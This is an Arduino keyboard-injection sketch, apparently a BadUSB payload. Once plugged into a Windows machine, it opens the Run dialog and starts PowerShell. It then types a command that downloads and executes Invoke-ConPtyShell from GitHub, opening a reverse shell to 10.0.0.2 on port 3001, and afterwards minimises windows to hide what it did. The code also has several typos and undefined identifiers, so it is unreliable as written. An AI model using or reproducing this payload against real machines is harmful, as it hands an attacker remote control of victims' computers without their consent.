#include <Keyboard.h>

void typeKey(uint8_t key){
  Keyboard.press(Key);
  delay(1000);
  Keyboard.release(Key);
}

void init(){
  Keyboard.begin();
  delay(3000);
}

void setup(){
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(r);
  Keybaord.releaseAll();

  delay(500);
  Keyboard.print(F("powershell.exe"));
  typeKey(KEY_RETURN);

  delay(500);
  Keyboard.print(F("IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001"));
  typeKey(KEY_RETURN);

  delay(500);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(d);
  Keyboard.releaseAll();

  Keyboard.end();
}

void loop() {

}